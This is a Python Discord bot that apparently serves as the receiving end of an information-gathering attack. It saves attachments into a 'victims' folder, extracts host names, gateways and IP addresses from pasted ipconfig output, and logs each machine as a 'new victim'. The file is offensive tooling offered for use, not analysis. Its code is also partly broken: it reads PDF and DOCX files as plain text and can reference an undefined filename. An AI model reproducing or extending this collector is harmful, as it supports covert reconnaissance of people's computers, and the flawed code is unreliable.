import discord
import os
import json
import re

intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.message_content = True
client = discord.Client(intents=intents)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

with open('config.json', 'r') as config_file:
    config_data = json.load(config_file)
    TOKEN = config_data['token']

if not os.path.exists('victims'):
    os.makedirs('victims')

@client.event
async def on_ready():
    clear_screen()
    print('Logged in as {0.user}'.format(client))

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.attachments:
        for attachment in message.attachments:
            file_extension = os.path.splitext(attachment.filename)[1].lower()
            text_document_extensions = ['.txt', '.pdf', '.docx']
            if file_extension in text_document_extensions:
                file_path = os.path.join('victims', attachment.filename)
                await attachment.save(file_path)
                file = open(file_path, 'r', encoding='utf-8')
                lines = file.readlines()
                new_file_lines = []  # Initialize an empty list to store the new lines
                host_name = None  # Initialize variables to store information
                default_gateway = None
                ipv4_address = None
                ipv6_address = None
                for line in lines:
                    if line.startswith("   Host Name . . . . . . . . . . . . : "):
                        host_name = line.replace("   Host Name . . . . . . . . . . . . : ", "").strip()
                    elif line.startswith("   Default Gateway . . . . . . . . . : "):
                        default_gateway = line.replace("   Default Gateway . . . . . . . . . : ", "").strip()
                    elif line.startswith("   IPv4 Address. . . . . . . . . . . : "):
                        ipv4_address = line.replace("   IPv4 Address. . . . . . . . . . . : ", "").strip()
                        ipv4_address = ipv4_address.replace("(Preferred)", "")
                    elif line.startswith("   IPv6 Address. . . . . . . . . . . : "):
                        ipv6_address_match = re.search(r'IPv6 Address[.\s]+: ([\w:]+)', line)
                        if ipv6_address_match:
                            ipv6_address = ipv6_address_match.group(1).strip()

                # Append labels and corresponding information to the new file lines
                if host_name:
                    new_file_lines.append("Host Name:")
                    new_file_lines.append(host_name)
                if default_gateway:
                    new_file_lines.append("Default Gateway:")
                    new_file_lines.append(default_gateway)
                if ipv4_address:
                    new_file_lines.append("IPv4 Address:")
                    new_file_lines.append(ipv4_address)
                if ipv6_address:
                    new_file_lines.append("IPv6 Address:")
                    new_file_lines.append(ipv6_address)

                if new_file_lines:
                    subdirectory_path = os.path.dirname(file_path)
                    new_filename = f"{host_name}.txt" if host_name else "victim0.txt"
                    new_info_file_path = os.path.join(subdirectory_path, new_filename)
                    with open(new_info_file_path, 'w', encoding='utf-8') as info_file:
                        info_file.write('\n'.join(new_file_lines))

                new_file_path = os.path.join('victims', new_filename)
                print(f"processed info, new victim : {os.path.splitext(new_filename)[0]}")
                print("...")
                file.close()
                os.remove(file_path)

client.run(TOKEN)
